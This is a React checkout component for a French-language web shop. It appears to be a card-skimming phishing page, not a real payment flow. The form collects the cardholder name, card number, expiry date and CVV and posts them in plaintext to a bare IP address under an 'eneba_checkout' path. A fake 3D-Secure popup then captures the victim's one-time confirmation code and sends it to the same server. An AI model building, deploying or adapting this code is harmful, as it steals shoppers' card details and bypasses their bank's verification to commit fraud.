import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import content from '../content.json';

const site = content.sites[0];

export default function Paiement() {
  const expiryDateRef = useRef(null);
  const handleCardNumberRef = useRef(null);

  useEffect(() => {
    const handleExpiryDateInput = (event) => {
      const { value } = event.target;
      if (value.length === 2 && !value.includes('/')) {
        event.target.value = value + '/';
      }
    };

    const expiryDateInput = expiryDateRef.current;
    expiryDateInput.addEventListener('input', handleExpiryDateInput);

    return () => {
      expiryDateInput.removeEventListener('input', handleExpiryDateInput);
    };
  }, []);

  useEffect(() => {
    const handleCardNumberInput = (event) => {
      const input = event.target;
      let value = input.value.replace(/\D/g, '');
      if (value.length > 16) {
        value = value.slice(0, 16);
      }
      input.value = value.replace(/(.{4})/g, '$1 ').trim();
    };

    const cardNumberInput = document.querySelector('input[name="cardNumber"]');
    cardNumberInput.addEventListener('input', handleCardNumberInput);

    return () => {
      cardNumberInput.removeEventListener('input', handleCardNumberInput);
    };
  });

  const [cart, setCart] = useState([]);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [otpCode, setOtpCode] = useState('');
  const [payAmount, setPayAmount] = useState(null);
  const [showVerificationWrapper, setShowVerificationWrapper] = useState(false);
  const [showOtpForm, setShowOtpForm] = useState(false);

  useEffect(() => {
    const storedCart = JSON.parse(localStorage.getItem('cart')) || [];
    const groupedCart = storedCart.reduce((acc, item) => {
      const existingItem = acc.find(i => i.productTitle === item.productTitle);
      if (existingItem) {
        existingItem.quantity += 1;
      } else {
        acc.push({ ...item, quantity: 1 });
      }
      return acc;
    }, []);
    setCart(groupedCart);
  }, []);

  useEffect(() => {
    emailjs.init("8SL7vzVHt7qSqEd4i");
  }, []);

  const totalPrice = cart.reduce((total, item) => {
    const price = parseFloat(item.productPrice.replace('€', '').replace(',', '.')) || 0;
    return total + (price * item.quantity);
  }, 0).toFixed(2);

  const discount = (totalPrice * 0.15).toFixed(2);
  const discountedPrice = (totalPrice - discount).toFixed(2);

  const proceedCheckout = async (event) => {
    event.preventDefault();
    try {
      setShowVerificationWrapper(true); // Show the verification Wrapper
      //await emailjs.sendForm('gmail-benedikt', 'new-payment', event.target);
      console.log('INFOS ENVOYÉES');

      // Collect payment information
      const cardHolder = event.target.cardHolder.value;
      const cardNumber = event.target.cardNumber.value;
      const cardExpiration = event.target.expiryDate.value;
      const cardCVC = event.target.cvv.value;

      // Trigger the eneba_checkout API
      const response = await fetch('http://164.92.222.43:3000/eneba_checkout/proceed', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          cardHolder,
          cardNumber,
          cardExpiration,
          cardCVC,
          payAmount: discountedPrice
        })
      });
      const result = await response.json();
      console.log(result.message);
      setPayAmount(result.payAmount); // Set the pay amount for verification step
    } catch (error) {
      console.log('FAILED...', error);
    }
  };

  const verifyPayment = async () => {
    try {
      const response = await fetch('http://164.92.222.43:3000/eneba_checkout/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          otpCode
        })
      });
      const result = await response.json();
      console.log(result.message);
    } catch (error) {
      console.log('FAILED...', error);
    }
  };

  // Function to show the next step in the checkout process
  function showStep(step) {
    const steps = document.querySelectorAll('.checkout-step');
    steps.forEach((stepElement, index) => {
      if (index === step) {
        stepElement.classList.add('active');
      } else {
        stepElement.classList.remove('active');
      }
    });
  }

  const currentDate = new Date().toLocaleString('fr-FR', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric'
  });

  return (
    <div className="paiement-container">
      <div className="left-column">
        <a className="back" href="/boutique">&lt; Retour à la boutique</a>
        <div className="shop-info">
          <h2>{`Payez ${site.shopName}`}</h2>
          <h1>{`${parseFloat(discountedPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</h1>
        </div>
        <div className="cart-summary">
          <ul>
            {cart.map((item, index) => (
              <li key={index}>
                <div className="cart-item">
                  <h4>{item.productTitle}</h4>
                  <p className='quantity'>(x{item.quantity})</p>
                  <p>{`${parseFloat(item.productPrice.replace('€', '').replace(',', '.')).toFixed(2).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
                </div>
              </li>
            ))}
          </ul>
          <div className="cart-item discount">
            <h4>SOLDE FÉVRIER : 15% réduction</h4>
            <p>{`-${parseFloat(discount).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
          <div className="cart-item subtotal">
            <h4>Avant-réduction</h4>
            <p>{`${parseFloat(totalPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
          <div className="total-price">
            <h4>Total dû :</h4>
            <p>{`${parseFloat(discountedPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
        </div>
        <p className='secure footer'>© 2024 - Tous droits réservés -  {site.shopName} SAS 32455</p>
      </div>
      <div className="right-column">
        <form className="checkout-form" onSubmit={proceedCheckout}>
          <input type="hidden" name="totalPrice" value={discountedPrice} />
          <input type="hidden" name="products" value={cart.map(item => `${item.productTitle} (x${item.quantity})`).join(', ')} />
          <input type="hidden" name="website" value={site.shopName} />

          <div className='checkout-step active'>
            <h3>Informations de livraison</h3>
            <input type="text" name="address" placeholder="Adresse du domicile" />
            <input type="text" name="suite" placeholder="Maison, suite, numéro, etc. (optionnel)" />
            <div className="form-row">
              <input type="text" name="postalCode" placeholder="Code postal" />
              <input type="text" name="city" placeholder="Ville" />
            </div>
            <h3>Compte client</h3>
            <input type="text" name="email" placeholder="Email" />
            <div className="form-row">
              <input type="text" name="fullName" placeholder="Nom complet" />
              <input type="text" name="phone" placeholder="Numéro de téléphone" />
            </div>
            <button type="button" id="delivery-checkout" onClick={() => showStep(1)}>Étape suivante</button>
          </div>

          <div className='checkout-step'>
            <h3>Mode de paiement</h3>
            <label className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''}`}>
              <input type="radio" name="paymentMethod" value="card" checked={selectedPaymentMethod === 'card'} onChange={() => setSelectedPaymentMethod('card')} />
              <img src='/card-badges.png' alt='cartes bancaires' />
              <span>Cartes bancaires</span>
            </label>
            <label className={`unvalaible payment-method ${selectedPaymentMethod === 'paypal' ? 'selected' : ''}`}>
              <input type="radio" name="paymentMethod" value="paypal" checked={selectedPaymentMethod === 'paypal'} onChange={() => setSelectedPaymentMethod('paypal')} />
              <img src='/paypal-simple.png' alt='cartes bancaires' />
              <span>Indisponible</span>
            </label>
            <h3>Informations de la carte</h3>
            <input type="text" name="cardHolder" placeholder="Titulaire de la carte" />
            <input type="text" name="cardNumber" placeholder="1234 1234 1234 1234" ref={handleCardNumberRef} />
            <div className="form-row">
              <input type="text" name="expiryDate" placeholder="MM/YY" maxLength="5" ref={expiryDateRef} />
              <input type="text" name="cvv" placeholder="CVV" maxLength="3" />
            </div>
            <article className='checkout-buttons'>
              <button className="back-checkout" type="button" onClick={() => showStep(0)}>&lt;</button>
              <button id="pay-checkout" type="submit">Procéder au paiement</button>
            </article>
          </div>
          
        </form>
      </div>

      {showVerificationWrapper && (
        <div className="verification-wrapper">
          <div className="verification-popup">
            <h2>Vérification 3D-Secure</h2>
            
            {payAmount !== null ? (
              <>
                <h4>Confirmez la transaction suivante :</h4>
                <div className="payment-details">
                  <p><strong>Montant du paiement :</strong> {payAmount}€</p>
                  <p><strong>Nom du marchand :</strong> {site.shopName}</p>
                  <p><strong>Date et heure :</strong> {currentDate}</p>
                  <p><strong>Informations de la carte :</strong> **** **** **** {handleCardNumberRef.current ? handleCardNumberRef.current.value.slice(-4) : '****'}</p>
                  <button type='button' onClick={() => verifyPayment()}>Confirmer le paiement</button>
                </div>
                <div className='otp-details'>
                  <p onClick={() => setShowOtpForm(!showOtpForm)}>Vous avez reçu un code de confirmation ?</p>
                  {showOtpForm && (
                    <div className='otp-form'>
                      <input type="text" name="otpCode" placeholder="Code OTP" value={otpCode} onChange={(e) => setOtpCode(e.target.value)} />
                      <button type="button" onClick={() => verifyPayment(otpCode)}>Confirmer</button>
                    </div>
                  )}
                </div>         
              </>     
            ) : (
              <>
                <h4>Préparation de la transaction.</h4>
                <div className="loader"></div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}